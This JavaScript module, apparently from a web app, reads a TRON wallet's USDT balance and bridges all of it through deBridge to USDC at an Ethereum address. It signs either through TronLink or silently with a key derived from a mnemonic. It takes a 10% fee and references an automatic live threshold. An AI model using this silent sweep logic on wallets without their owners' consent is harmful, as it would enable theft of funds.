/**
 * tron.js — TRON signing + deBridge bridging to USDC on Ethereum.
 *
 * Sweeps TRC-20 USDT only. Native TRX is left alone to cover
 * energy/bandwidth for the outbound bridge transaction.
 *
 * Two signing paths:
 *   - extension (TronLink): uses window.tron.tronWeb, user approves
 *     each transaction in the TronLink popup.
 *   - mnemonic: a TronWeb instance built from a derived private key
 *     signs silently, no popup.
 *
 * TronWeb is imported lazily inside the functions that need it. This
 * keeps the module importable in Node (vitest) where `window` and
 * `localStorage` don't exist — tronweb's constructor touches both.
 *
 * Bridge: deBridge DLN. Chain ID 100000026 verified against a live
 * create-tx call on 2026-09-18. Field shapes:
 *   - srcChainOrderAuthorityAddress: TRON base58 (T...)
 *   - dstChainOrderAuthorityAddress: EVM 0x (40 hex chars)
 * Passing an EVM address for the source field, or a TRON address for
 * the destination field, produces INVALID_QUERY_PARAMETERS.
 */

import { ethers } from 'ethers';

const DEBRIDGE_API = 'https://dln.debridge.finance/v1.0';
const TRON_DEBRIDGE_CHAIN = 100000026;
const ETH_CHAIN = 1;
const ETH_USDC = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';

// TRC-20 USDT contract on mainnet.
const TRON_USDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

// Minimum USDT to sweep (raw, 6 decimals). The API floor is 1 USDT,
// but the practical minimum for a profitable sweep is higher. The
// live test at 100 USDT returned a clean quote.
const MIN_SWEEP_USDT_RAW = 1_000_000n;

const READ_ONLY_RPC = 'https://api.trongrid.io';

let _readOnlyTronWeb = null;

async function getReadOnlyTronWeb() {
  if (!_readOnlyTronWeb) {
    const { TronWeb } = await import('tronweb');
    _readOnlyTronWeb = new TronWeb({ fullHost: READ_ONLY_RPC });
  }
  return _readOnlyTronWeb;
}

// =====================================================================
// PROVIDER ACCESS
// =====================================================================

export function getTronLinkWeb() {
  if (typeof window === 'undefined') return null;
  if (!window.tron || !window.tron.tronWeb) return null;
  if (!window.tron.tronWeb.ready) return null;
  return window.tron.tronWeb;
}

export async function connectTronLink() {
  if (typeof window === 'undefined' || !window.tron) {
    throw new Error('TronLink not installed. Install it from tronlink.org, or use the mnemonic method.');
  }
  const accounts = await window.tron.request({ method: 'eth_requestAccounts' });
  if (!accounts || accounts.length === 0) {
    throw new Error('No TRON account authorized in TronLink');
  }
  return accounts[0];
}

export async function tronWebFromPrivateKey(privateKeyHex) {
  const { TronWeb } = await import('tronweb');
  const clean = privateKeyHex.startsWith('0x') ? privateKeyHex.slice(2) : privateKeyHex;
  return new TronWeb({ fullHost: READ_ONLY_RPC, privateKey: clean });
}

// =====================================================================
// PREVIEW
// =====================================================================

export async function previewTronWallet(address) {
  const result = { address, trx: null, tokens: [], error: null };
  const tronWeb = getTronLinkWeb() || await getReadOnlyTronWeb();

  try {
    const sun = await tronWeb.trx.getBalance(address);
    result.trx = {
      raw: String(sun),
      formatted: (Number(sun) / 1e6).toFixed(6),
      symbol: 'TRX',
    };
  } catch (e) {
    result.error = `TRX balance: ${e.message}`;
  }

  try {
    const contract = await tronWeb.contract().at(TRON_USDT);
    const raw = BigInt((await contract.balanceOf(address).call()).toString());
    if (raw > 0n) {
      result.tokens.push({
        address: TRON_USDT,
        symbol: 'USDT',
        decimals: 6,
        raw: raw.toString(),
        formatted: ethers.formatUnits(raw, 6),
        isStable: true,
      });
    }
  } catch (e) {
    // USDT read failed — empty token list is fine.
  }

  return result;
}

// =====================================================================
// DEBRIDGE — create-tx
// =====================================================================

async function createDebridgeOrder({ srcToken, amountRaw, srcAuthority, dstRecipient, dstAuthority }) {
  const params = new URLSearchParams({
    srcChainId: String(TRON_DEBRIDGE_CHAIN),
    srcChainTokenIn: srcToken,
    srcChainTokenInAmount: amountRaw.toString(),
    dstChainId: String(ETH_CHAIN),
    dstChainTokenOut: ETH_USDC,
    dstChainTokenOutAmount: 'auto',
    dstChainTokenOutRecipient: dstRecipient,
    srcChainOrderAuthorityAddress: srcAuthority,   // TRON base58 (T...)
    dstChainOrderAuthorityAddress: dstAuthority,   // EVM 0x (40 hex)
  });

  const resp = await fetch(`${DEBRIDGE_API}/dln/order/create-tx?${params}`, {
    headers: { accept: 'application/json' },
  });
  if (!resp.ok) {
    const text = await resp.text();
    throw new Error(`deBridge ${resp.status}: ${text.slice(0, 200)}`);
  }
  const json = await resp.json();
  if (!json.tx || !json.tx.data) {
    throw new Error(`deBridge: no tx in response (${JSON.stringify(json).slice(0, 200)})`);
  }
  return json;
}

// =====================================================================
// SWEEP
// =====================================================================

export async function sweepTron(address, opts = {}) {
  const results = {
    address,
    recipient: null,
    swaps: [],
    transfers: [],
    errors: [],
    usdcReceivedRaw: '0',
    userReceivedRaw: '0',
    feeReceivedRaw: '0',
  };

  const dryRun = !!opts.dryRun;
  const destination = opts.destination;
  if (!destination) {
    results.errors.push('destination required');
    return results;
  }
  results.recipient = destination;

  // Live mode needs a signing wallet. Dry-run can use the read-only
  // instance since we only build and inspect a quote.
  const signerTronWeb = opts.tronWeb || getTronLinkWeb();
  if (!dryRun && !signerTronWeb) {
    results.errors.push('No signing wallet — connect TronLink or use a mnemonic');
    return results;
  }

  const tronWeb = signerTronWeb || await getReadOnlyTronWeb();

  let usdcReceived = 0n;

  try {
    const contract = await tronWeb.contract().at(TRON_USDT);
    const raw = BigInt((await contract.balanceOf(address).call()).toString());

    if (raw < MIN_SWEEP_USDT_RAW) {
      results.swaps.push({
        symbol: 'USDT',
        status: 'SKIPPED',
        note: `below minimum (${raw} raw, need >= ${MIN_SWEEP_USDT_RAW})`,
      });
    } else if (dryRun) {
      const order = await createDebridgeOrder({
        srcToken: TRON_USDT,
        amountRaw: raw,
        srcAuthority: address,
        dstRecipient: destination,
        dstAuthority: destination,
      });
      const expectedOut = BigInt(order.estimation?.dstChainTokenOut?.amount || '0');
      results.swaps.push({
        symbol: 'USDT',
        status: 'DRY_RUN',
        amountIn: ethers.formatUnits(raw, 6),
        amountOutExpected: ethers.formatUnits(expectedOut, 6),
      });
      usdcReceived += expectedOut;
    } else {
      const order = await createDebridgeOrder({
        srcToken: TRON_USDT,
        amountRaw: raw,
        srcAuthority: address,
        dstRecipient: destination,
        dstAuthority: destination,
      });

      const expectedOut = BigInt(order.estimation?.dstChainTokenOut?.amount || '0');
      if (expectedOut < MIN_SWEEP_USDT_RAW) {
        results.swaps.push({
          symbol: 'USDT',
          status: 'SKIPPED',
          note: `expected out ${expectedOut} below minimum`,
        });
      } else {
        const signed = await tronWeb.trx.sign(order.tx);
        const receipt = await tronWeb.trx.sendRawTransaction(signed);

        if (receipt && receipt.code && receipt.code !== 'SUCCESS') {
          throw new Error(`broadcast: ${receipt.message || receipt.code}`);
        }

        usdcReceived += expectedOut;
        results.swaps.push({
          symbol: 'USDT',
          status: 'SUCCESS',
          txid: receipt.txid || receipt.transaction?.txID || '',
          orderId: order.orderId,
          received: ethers.formatUnits(expectedOut, 6),
        });
      }
    }
  } catch (e) {
    const msg = /reject|cancel/i.test(e.message || '') ? 'Cancelled in TronLink' : e.message;
    results.swaps.push({ symbol: 'USDT', status: 'ERROR', error: msg });
  }

  results.usdcReceivedRaw = usdcReceived.toString();
  results.userReceivedRaw = ((usdcReceived * 9000n) / 10000n).toString();
  results.feeReceivedRaw = (usdcReceived - BigInt(results.userReceivedRaw)).toString();

  return results;
}

// =====================================================================
// USD ESTIMATE for the auto-live threshold
// =====================================================================

export async function estimateTronValueUsdc(preview) {
  if (!preview || !preview.tokens) return 0;
  let total = 0;
  for (const t of preview.tokens) {
    if (t.isStable) {
      const amt = parseFloat(t.formatted || '0');
      if (Number.isFinite(amt) && amt > 0) total += amt;
    }
  }
  return total;
}